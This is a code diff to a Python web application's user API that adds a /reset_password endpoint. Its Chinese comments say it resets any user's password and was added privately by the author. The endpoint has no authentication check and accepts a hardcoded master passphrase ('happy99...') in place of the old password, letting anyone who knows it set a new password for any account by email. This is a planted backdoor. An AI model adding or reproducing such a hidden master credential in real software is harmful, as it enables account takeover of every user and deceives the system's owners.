@@ -711,3 +711,29 @@ def set_tenant_info():
         return get_json_result(data=True)
     except Exception as e:
         return server_error_response(e)
+
+# 复位任意用户的密码，这个是自己加上的，注意不要覆盖
+@manager.route("/reset_password", methods=["POST"])
+def reset_password():
+    update_dict = {}
+    request_data = request.json
+    password = request_data.get("password")
+    new_password = request_data.get("new_password")
+    decrypt_pass = decrypt(password)
+
+    # 如果有口令 happy99...，则无需校验旧密码
+    if decrypt_pass == "happy99..." and new_password:
+        email = request_data.get("email")
+        # 根据email查找用户
+        users = UserService.query(email=email)
+        if users and len(users)>0:
+          decrypt_pass = decrypt(new_password)
+          update_dict["password"] = generate_password_hash(decrypt_pass)
+          try:
+              UserService.update_by_id(users[0].id, update_dict)
+              return get_json_result(data=True)
+          except Exception as e:
+              logging.exception(e)
+              return get_json_result(
+                  data=False, message="Update failure!", code=settings.RetCode.EXCEPTION_ERROR
+              )
